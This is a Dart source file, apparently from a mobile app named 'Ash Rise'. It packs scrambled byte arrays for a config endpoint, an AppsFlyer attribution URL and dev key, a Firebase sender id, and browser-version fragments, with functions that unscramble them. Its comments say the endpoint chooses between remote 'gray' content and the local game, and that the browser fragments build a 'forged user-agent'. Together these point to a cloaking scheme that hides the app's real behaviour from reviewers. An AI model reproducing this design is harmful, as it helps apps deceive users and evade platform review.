import '../cipher/scrambler.dart';

// ============================================================
// PACKED SECRETS — scrambled endpoints & credentials
// ============================================================
// Every array below is produced by `dart run tool/pack_secrets.dart`
// against the salt in lib/cipher/scrambler.dart. No plaintext secret
// ever appears as a literal here — that is the whole point.
//
// STATE (Ash Rise):
//   • configEndpoint / gcdBase / chrome / webkit — packed and live.
//   • attributionKey (AppsFlyer Dev Key) + messagingSender (Firebase
//     project number) — packed and live. If either rotates, edit the
//     plaintext in tool/pack_secrets.dart, re-run it, and repaste here.
// ============================================================

/// POST endpoint that decides remote (gray) vs local (game).
const List<int> _configEndpoint = <int>[
  251, 188, 188, 129, 156, 156, 79, 166, 241, 99, 22, 22, 14, 220, 103, 158, 0,
  76, 54, 199, 81, 183, 254, 25, 49, 172, 160, 33, 228, 126, 59
];

/// GCD base URL for the organic-retry attribution refresh.
const List<int> _gcdBase = <int>[
  251, 188, 188, 129, 156, 156, 79, 166, 247, 115, 26, 13, 24, 222, 58, 154, 94,
  95, 42, 204, 18, 173, 244, 5, 121, 166, 168, 98, 187, 127, 37, 38, 26, 19, 73,
  137, 81, 113, 242, 135, 144, 222, 64, 165, 82, 155, 131
];

/// Chrome major/build/patch fragment for the forged user-agent.
const List<int> _chromeVersion = <int>[
  162, 252, 241, 223, 223, 136, 87, 190, 164, 34, 80, 79, 77, 141
];

/// WebKit version fragment for the forged user-agent.
const List<int> _webkitVersion = <int>[166, 251, 255, 223, 220, 144];

/// AppsFlyer Dev Key.
const List<int> _attributionKey = <int>[
  202, 240, 162, 146, 167, 242, 24, 222, 253, 71, 72, 12, 10, 249, 70, 184, 91,
  88, 23, 240, 51, 149
];

/// Firebase project number / sender id.
const List<int> _messagingSender = <int>[
  165, 250, 241, 193, 216, 148, 83, 186, 165, 33, 76, 71
];

String unlockConfigEndpoint() => reveal(_configEndpoint);

String unlockAttributionKey() => reveal(_attributionKey);

String unlockMessagingSender() => reveal(_messagingSender);

String unlockChromeVersion() => reveal(_chromeVersion);

String unlockWebkitVersion() => reveal(_webkitVersion);

/// Builds the GCD (Get Conversion Data) retry URL. Returns "" when the base
/// URL is not packed — callers must read "" as "GCD retry unavailable".
String unlockGcdUrl(String appId, String deviceId) {
  final String base = reveal(_gcdBase);
  if (base.isEmpty) return '';
  return '$base$appId?devkey=${unlockAttributionKey()}&device_id=$deviceId';
}
